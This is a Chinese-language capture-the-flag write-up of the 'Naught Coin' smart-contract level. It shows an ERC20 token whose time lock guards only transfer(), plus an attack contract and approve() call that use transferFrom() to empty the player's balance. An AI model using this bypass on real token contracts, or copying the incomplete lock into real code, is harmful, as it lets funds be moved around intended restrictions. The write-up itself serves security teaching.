# Naught Coin

NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

## 攻击思路

先授权给合约，合约再把钱转走。

## 攻击流程

部署攻击合约

```solidity
contract Attack {
    
    NaughtCoin constant private target = NaughtCoin(0xAB4a4181894300d2A115CA734BEd562046419eD0);

    function attack() public {
        uint256 balance = target.balanceOf(msg.sender);
        target.transferFrom(msg.sender,address(this),balance);
    }
}
```

账户调用NaughtCoin合约的approve函数，函数参数：

```
// 攻击合约地址，我的余额
0xED6FbE8E0e89935998c5542078194da57367D3ff,1000000000000000000000000
```

最后调用Attack合约的attack函数，攻击成功

当您使用自己的代码以外的代码时，最好熟悉它以充分了解它们是如何编写在一起的。当有多个层级的导入时（您的导入包含其它导入）或您正在实施授权控制时，这一点尤其重要, 比如当您允许或阻止人们做某事时. 在这个案例中, 开发人员可能会查看代码并认为 transfer 函数是移动Token的唯一方法，但发现还有其他方法可以使用不同的实现来执行相同的操作。